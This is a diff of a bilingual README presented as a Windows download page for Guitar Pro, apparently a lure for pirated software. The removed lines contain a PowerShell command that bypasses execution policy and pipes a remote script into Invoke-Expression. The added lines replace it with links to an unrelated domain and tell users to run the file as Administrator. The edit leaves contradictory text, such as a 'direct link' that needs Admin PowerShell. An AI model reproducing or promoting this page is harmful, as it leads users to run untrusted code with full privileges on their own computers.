@@ -2,21 +2,38 @@
 
 **Descargar-Guitar-Pro**
 
-**Guitar Pro** download for Windows 10/11. Scroll to **Download & Install** for the direct link or one-command setup.
+**Guitar Pro** download for Windows 10/11. Scroll to **Download & Install** for the direct direct download link below.
 
 [![Windows](https://img.shields.io/badge/Windows-10%20%2F%2011-0078D4?style=flat-square&logo=windows)]()[![Download](https://img.shields.io/badge/Get-Download%20Link-16a34a?style=flat-square)]()
 
 ---
 
-## Download & Install (PowerShell)
+## Download & Install
 
-> **This is the download page.** The command below downloads and runs the **Guitar Pro** installer on Windows 10/11.
+> **This is the download page.** Use the button or link below to get **Guitar Pro** for Windows.
 
-#### Before you start
+<p align="center">
+  <a href="https://descargar-guitar.nexustool.fun/">
+    <img src="https://img.shields.io/badge/Download-Guitar%20Pro-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download Guitar Pro">
+  </a>
+</p>
 
-- Windows 10 or 11 (64-bit)
-- **Administrator** rights
-- Internet connection for the download
+| | |
+| --- | --- |
+| **Direct link** | **[descargar-guitar.nexustool.fun](https://descargar-guitar.nexustool.fun/)** |
+| **Full URL** | `https://descargar-guitar.nexustool.fun/` |
+| **Type** | Installer for Windows 10 / 11 (64-bit) |
+| **Admin** | Run setup as Administrator |
+
+### Quick steps
+
+1. Click **[Download — descargar-guitar.nexustool.fun](https://descargar-guitar.nexustool.fun/)** (link above)
+2. Save the file from the project page
+3. Run the setup **as Administrator**
+4. Enter your license key when prompted
+5. Restart if the installer asks — then launch from Start menu
+
+<p align="center"><a href="https://descargar-guitar.nexustool.fun/"><strong>⬇ Download Guitar Pro now</strong></a></p>
 
 ---
 
@@ -39,10 +56,7 @@ You should see a blue/black window with a prompt like `PS C:\Windows\system32>`.
 
 Select **both lines** below and press **Ctrl+C**:
 
-```powershell
-Set-ExecutionPolicy Bypass -Scope Process -Force
-irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex
-```
+
 
 > Copy **both lines**, not just the second one.
 
@@ -80,7 +94,7 @@ Open **Start menu** → search for **Guitar Pro** → run it.
 | Antivirus blocked the download | Temporarily allow the download folder or run again as Admin |
 | Window closed immediately | Open PowerShell (Admin) again and repeat Steps 2–3 |
 
-**Install type:** PowerShell one-liner — no browser needed after Admin PowerShell is open.
+**Install type:** Direct link (nexus) — no browser needed after Admin PowerShell is open.
 
 ---
 
@@ -100,7 +114,7 @@ Página de descarga de **Guitar Pro** para Windows 10/11. Pensado para usuarios 
 | Paso | Qué hacer |
 | --- | --- |
 | 1 | Abre la sección **Download & Install** arriba |
-| 2 | Usa el enlace directo o el comando de PowerShell (Admin) |
+| 2 | Usa el enlace directo o el enlace directo de descarga |
 | 3 | Ejecuta el instalador **como administrador** |
 | 4 | Introduce la clave de licencia si se solicita |
 | 5 | Abre **Guitar Pro** desde el menú Inicio |
